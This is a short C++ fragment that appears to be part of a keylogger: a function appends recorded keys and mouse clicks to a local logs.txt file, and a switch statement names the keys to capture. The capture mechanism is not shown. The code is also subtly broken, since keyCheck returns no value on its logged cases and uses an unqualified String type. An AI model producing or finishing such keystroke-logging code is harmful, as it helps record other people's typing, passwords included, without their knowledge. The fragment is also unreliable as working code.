void wtlog(String data){
	ofstream logs;
	logs.open("logs.txt", fstream::app);
	logs << data;
	logs.close();
}

bool keyCheck(int key){
	switch(key){
		case Rclick:
			std::cout<<" -Right Click- ";
			wtlog(" -Right Click- ");
			break;
			
		case Lclick:
			std::cout<<" -Left Click- ";
			wtlog(" -Left Click- ");
			break;
		
		case Space:
			std::cout<<" ";
			wtlog(" ");
			break;
		
		case Enter:
			std::cout<<"\n";
			wtlog("\n");
			break;
			
		case Shift:
			std::cout<<" -Shift- ";
			wtlog(" -Shift- ");
			break;
			
		case Backspace:
			std::cout<<"\b";
			wtlog("\b");
			break;
			
		default:
			return false;
	}
}
